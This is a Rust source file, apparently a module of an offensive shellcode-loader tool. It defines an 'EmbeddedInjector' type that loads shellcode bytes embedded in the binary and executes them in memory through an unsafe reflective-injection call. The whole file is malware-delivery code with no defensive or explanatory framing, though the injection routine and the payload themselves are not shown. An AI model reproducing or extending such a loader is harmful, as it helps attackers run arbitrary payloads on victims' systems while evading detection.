use crate::injectors::{
    Injector,
    InjectorType,
    InjectionType,
    InjectorError,
    reflective_inject
};

pub struct EmbeddedInjector {
    wait: bool,
    shellcode: Option<Vec<u8>>
}

impl EmbeddedInjector {
    pub fn new() -> EmbeddedInjector {
        EmbeddedInjector { wait: false, shellcode: None }
    }

}

impl Injector for EmbeddedInjector {
    fn load(self, sc_source: InjectorType) -> Result<EmbeddedInjector, InjectorError> {
        use InjectorType::Embedded;
        match sc_source {
            Embedded(sc) => {
                Ok(EmbeddedInjector { wait: false, shellcode: Some(sc) })
            }
            _ => Err(InjectorError("Incorrect Shellcode Type!".to_string()))
        }
    }

    fn wait(self) -> EmbeddedInjector {
        EmbeddedInjector { wait: true, shellcode: self.shellcode }
    }

    fn inject(&self, injection_type: InjectionType, wait: bool) -> Result<(), InjectorError> {

        match &self.shellcode {
            Some(sc) => unsafe { reflective_inject(&self.shellcode.clone().unwrap(), true) },
            None => panic!("No shellcode loaded!")
        }
        
    }
}